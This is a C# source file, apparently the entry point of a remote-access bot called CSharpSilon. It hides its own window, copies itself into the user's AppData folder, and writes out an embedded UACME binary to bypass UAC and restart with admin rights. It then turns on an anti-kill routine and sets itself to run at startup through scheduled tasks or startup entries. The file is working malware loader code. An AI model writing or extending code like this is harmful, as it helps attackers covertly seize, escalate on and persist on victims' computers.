using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using CSharpSilion;
using CSharpSilon.Utils;
using CSharpSilon.Utils;

namespace CSharpSilon
{
    class Program
    {

        
        static async Task Main(string[] args)
        {
            StartBot(); // I Use This For Testing <3
            
            
            // Checks If The .exe Was Started With 1 Argument. Then Starts It With The Silent Argument.
            if (args.Length != 1)
            {
                Process.Start(new ProcessStartInfo()
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    Arguments = "-sil",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Verb = App.IsAdmin() ? "runas" : "",
                });
                Process.GetCurrentProcess().Kill();
            }
            
            // If It's Started Silently, Then It Starts The Bot.
            if (args.Length == 1)
            {
                if (args[0] == "-sil")
                {
                    StartBot();
                    Process.GetCurrentProcess().Kill();
                }
                else
                {
                    Process.GetCurrentProcess().Kill();
                }
            }
        }

        static async Task StartBot()
        {
            if (Config.Install && Process.GetCurrentProcess().MainModule.FileName != $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{Process.GetCurrentProcess().ProcessName}.exe")
            {
                try
                {
                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\{Process.GetCurrentProcess().ProcessName}.exe", true);
                    App.execute(Process.GetCurrentProcess().MainModule.FileName);
                    Environment.Exit(0);
                }
                catch { }
            }
            
            
            //This Is Used For UAC Bypassing. Source To The File: https://github.com/hfiref0x/UACME
            string filePath = Path.Combine(Path.GetTempPath(), "kudos.exe");
            if (!File.Exists(filePath))
            {
                File.WriteAllBytes(filePath, Convert.FromBase64String(Resources.ResourceManager.GetObject("kudos.txt").ToString()));
            }
            if (!App.IsAdmin())
            {
                if (!File.Exists(filePath))
                {
                    while (!File.Exists(filePath))
                    {
                        Thread.Sleep(750);
                    }
                }
                //Restarts The App As Admin, Then Exits The Current Process
                App.execute($"{filePath} 61 {Process.GetCurrentProcess().MainModule.FileName}");
                Environment.Exit(0);
            }

            if (App.IsAdmin() && Config.AntiKill)
            {
                AntiKill.Enable();
            }
            
            // Prevents Multiple Processes From Running.
            var curProc = Process.GetCurrentProcess();
            var procs = Process.GetProcessesByName(curProc.ProcessName);
            if (procs.Length > 1)
            {
                Environment.Exit(0);
            }
            
            // Put's The Bot On Startup Automatically If The User Wants It To Be
            if (Config.OnStartup)
            {
                if (App.IsAdmin() && !schtasks.GetStartup())
                {
                    schtasks.HandleStartup();
                }
                else
                {
                    if (!NormalStartup.GetStartup())
                    {
                        NormalStartup.HandleStartup();
                    }
                }
            }
            
            


            var bot = new Bot();
            bot.RunAsync().GetAwaiter().GetResult();
            Console.ReadLine();
        }
    }
}